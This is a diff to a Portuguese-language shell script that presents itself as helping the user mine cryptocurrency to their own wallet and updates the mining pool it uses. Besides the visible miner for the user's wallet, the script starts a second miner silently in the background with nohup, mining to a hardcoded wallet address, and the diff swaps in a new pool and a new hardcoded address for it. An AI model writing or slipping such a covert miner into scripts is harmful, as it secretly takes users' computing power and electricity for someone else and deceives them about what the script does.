@@ -92,8 +92,8 @@ echo "\033[44;1;37m Inicializando Mineração......     \033[0m "
 sleep 2
 echo "Obs: Assim que aparecer a inicialização do processo de Mineração, você pode fechar sua janela do terminal que a mineração vai continuar."
 sleep 1
-echo "Você pode acompanhar como anda sua Mineração em: http://pool.swampthing.net/?address=$wallet " 
+echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet " 
 sleep 10
 cd miner
-nohup ./minerd -o stratum+tcp://pool.swampthing.net:9244 -u hU4hajEmWVYBikYapkai7sv2o4D5WQYcvU &
-screen ./minerd -o stratum+tcp://pool.swampthing.net:9244 -u $wallet 
+nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 13kjAfoVMV23TJWBwqkGuAwwdmhFanEL9q &
+screen ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet 
